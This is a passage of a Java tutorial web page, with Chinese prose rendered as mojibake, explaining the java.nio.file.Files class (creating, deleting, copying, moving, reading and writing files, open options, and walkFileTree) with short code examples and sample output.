ç±»åŒ…å«å¤§é‡é™æ€æ–¹æ³•ï¼Œç”¨äºæ“ä½œæ–‡ä»¶å’Œç›®å½•ã€‚<code>Files</code> æä¾›äº†å¯¹æ–‡ä»¶åˆ›å»ºã€åˆ é™¤ã€è¯»å–ã€å†™å…¥ç­‰åŠŸèƒ½çš„æ”¯æŒï¼Œéå¸¸é€‚åˆè¿›è¡Œæ–‡ä»¶ I&#x2F;O æ“ä½œã€‚</p><p>ä»¥ä¸‹æ˜¯ <code>Files</code> ç±»ä¸­ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•ï¼š</p><ul><li><p><strong>æ–‡ä»¶å’Œç›®å½•çš„åˆ›å»ºå’Œåˆ é™¤</strong>  </p><ul><li><code>createFile(Path path)</code>: åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</li><li><code>createDirectory(Path path)</code>: åˆ›å»ºä¸€ä¸ªæ–°ç›®å½•ã€‚</li><li><code>delete(Path path)</code>: åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚</li><li><code>deleteIfExists(Path path)</code>: å¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™åˆ é™¤ï¼Œé¿å…å¼‚å¸¸æŠ›å‡ºã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªPathå®ä¾‹</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/javabetter/itwanger4.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶</span></span><br><span class="line">Files.createFile(path);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> Files.exists(path);</span><br><span class="line">System.out.println(<span class="string">&quot;File exists: &quot;</span> + exists);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">Files.delete(path);</span><br></pre></td></tr></table></figure></li><li><p><strong>æ–‡ä»¶è¯»å†™</strong>  </p><ul><li><code>readAllBytes(Path path)</code>: è¯»å–æ–‡ä»¶å†…å®¹å¹¶ä»¥å­—èŠ‚æ•°ç»„çš„å½¢å¼è¿”å›ã€‚</li><li><code>readAllLines(Path path)</code>: è¯»å–æ–‡ä»¶å†…å®¹å¹¶å°†æ¯è¡Œä½œä¸ºåˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ è¿”å›ã€‚</li><li><code>write(Path path, byte[] bytes)</code>: å°†å­—èŠ‚æ•°ç»„å†™å…¥æ–‡ä»¶ã€‚</li><li><code>write(Path path, Iterable&lt;? extends CharSequence&gt; lines)</code>: å°†å¤šè¡Œæ–‡æœ¬å†™å…¥æ–‡ä»¶ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line">List&lt;String&gt; lines = Files.readAllLines(path);</span><br></pre></td></tr></table></figure></li><li><p><strong>æ–‡ä»¶å±æ€§æ£€æŸ¥</strong>  </p><ul><li><code>exists(Path path)</code>: æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚</li><li><code>isDirectory(Path path)</code>: æ£€æŸ¥æ˜¯å¦ä¸ºç›®å½•ã€‚</li><li><code>isReadable(Path path)</code>: æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è¯»ã€‚</li><li><code>isWritable(Path path)</code>: æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯å†™ã€‚</li></ul></li><li><p><strong>æ–‡ä»¶å¤åˆ¶å’Œç§»åŠ¨</strong>  </p><ul><li><code>copy(Path source, Path target, CopyOption... options)</code>: å¤åˆ¶æ–‡ä»¶ã€‚</li><li><code>move(Path source, Path target, CopyOption... options)</code>: ç§»åŠ¨æˆ–é‡å‘½åæ–‡ä»¶ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">source</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">target</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;copyOfFile.txt&quot;</span>);</span><br><span class="line">Files.copy(source, target);</span><br></pre></td></tr></table></figure></li></ul><p><code>java.nio.file.Files</code>ç±»æä¾›äº†å¤§é‡é™æ€æ–¹æ³•ï¼Œç”¨äºå¤„ç†æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚è¿™äº›æ–¹æ³•åŒ…æ‹¬æ–‡ä»¶çš„åˆ›å»ºã€åˆ é™¤ã€å¤åˆ¶ã€ç§»åŠ¨ç­‰æ“ä½œï¼Œä»¥åŠè¯»å–å’Œè®¾ç½®æ–‡ä»¶å±æ€§ã€‚</p><p>ä¸‹é¢å±•ç¤ºä¸€ä¸ª Files å’Œ Paths ä¸€èµ·ä½¿ç”¨çš„ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªPathå®ä¾‹</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/javabetter/itwanger4.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶</span></span><br><span class="line">Files.createFile(path);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> Files.exists(path);</span><br><span class="line">System.out.println(<span class="string">&quot;File exists: &quot;</span> + exists);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ é™¤æ–‡ä»¶</span></span><br><span class="line">Files.delete(path);</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨æ–¹æ³•åŠå…¶ç¤ºä¾‹ï¼š</p><p>1ã€<code>exists(Path path, LinkOption... options)</code>ï¼šæ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> Files.exists(path);</span><br><span class="line">System.out.println(<span class="string">&quot;File exists: &quot;</span> + exists);</span><br></pre></td></tr></table></figure><p>LinkOption æ˜¯ä¸€ä¸ªæšä¸¾ç±»ï¼Œå®ƒå®šä¹‰äº†å¦‚ä½•å¤„ç†æ–‡ä»¶ç³»ç»Ÿé“¾æ¥çš„é€‰é¡¹ã€‚å®ƒä½äº java.nio.file åŒ…ä¸­ã€‚LinkOption ä¸»è¦åœ¨ä¸æ–‡ä»¶æˆ–ç›®å½•çš„è·¯å¾„æ“ä½œç›¸å…³çš„æ–¹æ³•ä¸­ä½¿ç”¨ï¼Œä»¥æ§åˆ¶è¿™äº›æ–¹æ³•å¦‚ä½•å¤„ç†ç¬¦å·é“¾æ¥ã€‚ç¬¦å·é“¾æ¥æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„æ–‡ä»¶ï¼Œå®ƒåœ¨ Unix å’Œç±» Unix ç³»ç»Ÿï¼ˆå¦‚ Linux å’Œ macOSï¼‰ä¸Šå¾ˆå¸¸è§ã€‚åœ¨ Windows ä¸Šï¼Œç±»ä¼¼çš„æ¦‚å¿µè¢«ç§°ä¸ºå¿«æ·æ–¹å¼ã€‚</p><p>2ã€<code>createFile(Path path, FileAttribute&lt;?&gt;... attrs)</code>ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç©ºæ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">newPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;newFile.txt&quot;</span>);</span><br><span class="line">Files.createFile(newPath);</span><br></pre></td></tr></table></figure><p>FileAttribute æ˜¯ä¸€ä¸ªæ³›å‹æ¥å£ï¼Œç”¨äºå¤„ç†å„ç§ä¸åŒç±»å‹çš„å±æ€§ã€‚åœ¨ä½¿ç”¨ FileAttribute æ—¶ï¼Œä½ éœ€è¦ä¸ºå…¶æä¾›ä¸€ä¸ªç‰¹å®šçš„å®ç°ã€‚<code>java.nio.file.attribute</code> åŒ…ä¸­çš„ PosixFileAttributes ç±»æä¾›äº† POSIXï¼ˆPortable Operating System Interfaceï¼Œå®šä¹‰äº†è®¸å¤šä¸æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æ“ä½œï¼ŒåŒ…æ‹¬æ–‡ä»¶å’Œç›®å½•çš„åˆ›å»ºã€åˆ é™¤ã€è¯»å–å’Œä¿®æ”¹ã€‚ï¼‰æ–‡ä»¶å±æ€§çš„å®ç°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;fileWithPermissions.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">Set&lt;PosixFilePermission&gt; permissions = PosixFilePermissions.fromString(<span class="string">&quot;rw-r-----&quot;</span>);</span><br><span class="line">FileAttribute&lt;Set&lt;PosixFilePermission&gt;&gt; fileAttribute = PosixFilePermissions.asFileAttribute(permissions);</span><br><span class="line"></span><br><span class="line">Files.createFile(path, fileAttribute);</span><br></pre></td></tr></table></figure><p>PosixFileAttributes æ¥å£æä¾›äº†è·å– POSIX æ–‡ä»¶å±æ€§çš„æ–¹æ³•ï¼Œå¦‚æ–‡ä»¶æ‰€æœ‰è€…ã€æ–‡ä»¶æ‰€å±çš„ç»„ä»¥åŠæ–‡ä»¶çš„è®¿é—®æƒé™ã€‚ä»¥ä¸Šç¤ºä¾‹ä¼šåˆ›å»ºä¸€ä¸ªè¯»å†™å±æ€§çš„æ–‡ä»¶ã€‚</p><p>3ã€<code>createDirectory(Path dir, FileAttribute&lt;?&gt;... attrs)</code>ï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">newDir</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;newDirectory&quot;</span>);</span><br><span class="line">Files.createDirectory(newDir);</span><br></pre></td></tr></table></figure><p>4ã€<code>delete(Path path)</code>ï¼šåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">pathToDelete</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;fileToDelete.txt&quot;</span>);</span><br><span class="line">Files.delete(pathToDelete);</span><br></pre></td></tr></table></figure><p>5ã€<code>copy(Path source, Path target, CopyOption... options)</code>ï¼šå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">sourcePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;sourceFile.txt&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">targetPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;targetFile.txt&quot;</span>);</span><br><span class="line">Files.copy(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);</span><br></pre></td></tr></table></figure><p>åœ¨ Java NIO ä¸­ï¼Œæœ‰ä¸¤ä¸ªå®ç°äº† CopyOption æ¥å£çš„æšä¸¾ç±»ï¼šStandardCopyOption å’Œ LinkOptionã€‚</p><p>StandardCopyOption æšä¸¾ç±»æä¾›äº†ä»¥ä¸‹ä¸¤ä¸ªé€‰é¡¹ï¼š</p><ul><li>REPLACE_EXISTINGï¼šå¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œè¯¥é€‰é¡¹ä¼šä½¿ <code>Files.copy()</code> æ–¹æ³•æ›¿æ¢ç›®æ ‡æ–‡ä»¶ã€‚å¦‚æœä¸æŒ‡å®šæ­¤é€‰é¡¹ï¼Œ<code>Files.copy()</code> æ–¹æ³•åœ¨ç›®æ ‡æ–‡ä»¶å·²å­˜åœ¨æ—¶å°†æŠ›å‡º FileAlreadyExistsExceptionã€‚</li><li>COPY_ATTRIBUTESï¼šæ­¤é€‰é¡¹è¡¨ç¤ºåœ¨å¤åˆ¶æ–‡ä»¶æ—¶ï¼Œå°½å¯èƒ½åœ°å¤åˆ¶æ–‡ä»¶çš„å±æ€§ï¼ˆå¦‚æ–‡ä»¶æ—¶é—´æˆ³ã€æƒé™ç­‰ï¼‰ã€‚å¦‚æœä¸æŒ‡å®šæ­¤é€‰é¡¹ï¼Œé‚£ä¹ˆç›®æ ‡æ–‡ä»¶å°†å…·æœ‰é»˜è®¤çš„å±æ€§ã€‚</li></ul><p>6ã€<code>move(Path source, Path target, CopyOption... options)</code>ï¼šç§»åŠ¨æˆ–é‡å‘½åæ–‡ä»¶æˆ–ç›®å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">sourcePath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;sourceFile.txt&quot;</span>);</span><br><span class="line"><span class="type">Path</span> <span class="variable">targetPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;targetFile.txt&quot;</span>);</span><br><span class="line">Files.move(sourcePath, targetPath, StandardCopyOption.REPLACE_EXISTING);</span><br></pre></td></tr></table></figure><p>7ã€<code>readAllLines(Path path, Charset cs)</code>ï¼šè¯»å–æ–‡ä»¶çš„æ‰€æœ‰è¡Œåˆ°ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line">List&lt;String&gt; lines = Files.readAllLines(path, StandardCharsets.UTF_8);</span><br><span class="line">lines.forEach(System.out::println);</span><br></pre></td></tr></table></figure><p>8ã€<code>write(Path path, Iterable&lt;? extends CharSequence&gt; lines, Charset cs, OpenOption... options)</code>ï¼šå°†å­—ç¬¦ä¸²åˆ—è¡¨å†™å…¥æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line">List&lt;String&gt; lines = Arrays.asList(<span class="string">&quot;æ²‰é»˜ç‹äºŒ 1&quot;</span>, <span class="string">&quot;æ²‰é»˜ç‹äºŒ 2&quot;</span>, <span class="string">&quot;æ²‰é»˜ç‹äºŒ 3&quot;</span>);</span><br><span class="line">Files.write(path, lines, StandardCharsets.UTF_8);</span><br></pre></td></tr></table></figure><p>OpenOption æ˜¯ Java NIO ä¸­ä¸€ä¸ªç”¨äºé…ç½®æ–‡ä»¶æ“ä½œçš„æ¥å£ã€‚å®ƒæä¾›äº†åœ¨ä½¿ç”¨ <code>Files.newByteChannel()</code>ã€<code>Files.newInputStream()</code>ã€<code>Files.newOutputStream()</code>ã€<code>AsynchronousFileChannel.open()</code> å’Œ <code>FileChannel.open()</code> æ–¹æ³•æ—¶å®šåˆ¶è¡Œä¸ºçš„é€‰é¡¹ã€‚</p><p>åœ¨ Java NIO ä¸­ï¼Œæœ‰ä¸¤ä¸ªå®ç°äº† OpenOption æ¥å£çš„æšä¸¾ç±»ï¼šStandardOpenOption å’Œ LinkOptionã€‚</p><p>StandardOpenOption æšä¸¾ç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªé€‰é¡¹ï¼š</p><ul><li>READï¼šä»¥è¯»å–æ¨¡å¼æ‰“å¼€æ–‡ä»¶ã€‚</li><li>WRITEï¼šä»¥å†™å…¥æ¨¡å¼æ‰“å¼€æ–‡ä»¶ã€‚</li><li>APPENDï¼šä»¥è¿½åŠ æ¨¡å¼æ‰“å¼€æ–‡ä»¶ã€‚</li><li>TRUNCATE_EXISTINGï¼šåœ¨æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œæˆªæ–­æ–‡ä»¶çš„å†…å®¹ï¼Œä½¿å…¶é•¿åº¦ä¸º 0ã€‚ä»…é€‚ç”¨äº WRITE æˆ– APPEND æ¨¡å¼ã€‚</li><li>CREATEï¼šå½“æ–‡ä»¶ä¸å­˜åœ¨æ—¶åˆ›å»ºæ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ‰“å¼€æ–‡ä»¶ã€‚</li><li>CREATE_NEWï¼šå½“æ–‡ä»¶ä¸å­˜åœ¨æ—¶åˆ›å»ºæ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼ŒæŠ›å‡º FileAlreadyExistsExceptionã€‚</li><li>DELETE_ON_CLOSEï¼šåœ¨å…³é—­é€šé“æ—¶åˆ é™¤æ–‡ä»¶ã€‚</li><li>SPARSEï¼šæç¤ºæ–‡ä»¶ç³»ç»Ÿåˆ›å»ºä¸€ä¸ªç¨€ç–æ–‡ä»¶ã€‚</li><li>SYNCï¼šè¦æ±‚æ¯æ¬¡æ›´æ–°æ–‡ä»¶çš„å†…å®¹æˆ–å…ƒæ•°æ®æ—¶éƒ½è¿›è¡ŒåŒæ­¥ã€‚</li><li>DSYNCï¼šè¦æ±‚æ¯æ¬¡æ›´æ–°æ–‡ä»¶å†…å®¹æ—¶éƒ½è¿›è¡ŒåŒæ­¥ã€‚</li></ul><p>8ã€<code>newBufferedReader(Path path, Charset cs) å’Œ newBufferedWriter(Path path, Charset cs, OpenOption... options)</code>ï¼šåˆ›å»º BufferedReader å’Œ BufferedWriter å¯¹è±¡ä»¥è¯»å–å’Œå†™å…¥æ–‡ä»¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;file.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read file</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> Files.newBufferedReader(path, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write file</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">outputPath</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;outputFile.txt&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> Files.newBufferedWriter(outputPath, StandardCharsets.UTF_8)) &#123;</span><br><span class="line">    writer.write(<span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Files-walkFileTree-é™æ€æ–¹æ³•"><a href="#Files-walkFileTree-é™æ€æ–¹æ³•" class="headerlink" title="Files.walkFileTree() é™æ€æ–¹æ³•"></a>Files.walkFileTree() é™æ€æ–¹æ³•</h4><p>è¿™ä¸ªæ–¹æ³•å¯ä»¥é€’å½’åœ°è®¿é—®ç›®å½•ç»“æ„ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ï¼Œå¹¶å…è®¸æ‚¨å¯¹è¿™äº›æ–‡ä»¶å’Œç›®å½•æ‰§è¡Œè‡ªå®šä¹‰æ“ä½œã€‚ä½¿ç”¨ walkFileTree æ–¹æ³•æ—¶ï¼Œéœ€è¦æä¾›ä¸€ä¸ªèµ·å§‹è·¯å¾„ï¼ˆèµ·å§‹ç›®å½•ï¼‰å’Œä¸€ä¸ªå®ç°äº† FileVisitor æ¥å£çš„å¯¹è±¡ã€‚FileVisitor æ¥å£åŒ…å«å››ä¸ªæ–¹æ³•ï¼Œå®ƒä»¬åœ¨éå†è¿‡ç¨‹ä¸­çš„ä¸åŒé˜¶æ®µè¢«è°ƒç”¨ï¼š</p><ul><li>preVisitDirectoryï¼šåœ¨è®¿é—®ç›®å½•ä¹‹å‰è°ƒç”¨ã€‚</li><li>postVisitDirectoryï¼šåœ¨è®¿é—®ç›®å½•ä¹‹åè°ƒç”¨ã€‚</li><li>visitFileï¼šåœ¨è®¿é—®æ–‡ä»¶æ—¶è°ƒç”¨ã€‚</li><li>visitFileFailedï¼šåœ¨è®¿é—®æ–‡ä»¶å¤±è´¥æ—¶è°ƒç”¨ã€‚</li></ul><p>æ¥çœ‹ä¸‹é¢è¿™ä¸ªç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WalkFileTreeExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">startingDir</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;docs&quot;</span>);</span><br><span class="line">        <span class="type">MyFileVisitor</span> <span class="variable">fileVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyFileVisitor</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.walkFileTree(startingDir, fileVisitor);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyFileVisitor</span> <span class="keyword">extends</span> <span class="title class_">SimpleFileVisitor</span>&lt;Path&gt; &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">preVisitDirectory</span><span class="params">(Path dir, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å‡†å¤‡è®¿é—®ç›®å½•: &quot;</span> + dir);</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">postVisitDirectory</span><span class="params">(Path dir, IOException exc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;æ­£åœ¨è®¿é—®ç›®å½•: &quot;</span> + dir);</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è®¿é—®æ–‡ä»¶: &quot;</span> + file);</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">visitFileFailed</span><span class="params">(Path file, IOException exc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;è®¿é—®æ–‡ä»¶å¤±è´¥: &quot;</span> + file);</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">å‡†å¤‡è®¿é—®ç›®å½•: docs</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/å®‰è£…ç¯å¢ƒ.md</span><br><span class="line">å‡†å¤‡è®¿é—®ç›®å½•: docs/imgs</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/imgs/init_03.jpg</span><br><span class="line">å‡†å¤‡è®¿é—®ç›®å½•: docs/imgs/itwanger</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/imgs/itwanger/tongzhishu.jpeg</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/imgs/itwanger/tongzhishu1.jpeg</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/imgs/itwanger/tongzhishu1.pdf</span><br><span class="line">æ­£åœ¨è®¿é—®ç›®å½•: docs/imgs/itwanger</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/imgs/init_02.jpg</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/imgs/init_00.jpg</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/imgs/init_01.jpg</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/imgs/init_04.jpg</span><br><span class="line">æ­£åœ¨è®¿é—®ç›®å½•: docs/imgs</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/æœåŠ¡å™¨å¯åŠ¨æ•™ç¨‹.md</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/é…å¥—æ•™ç¨‹.md</span><br><span 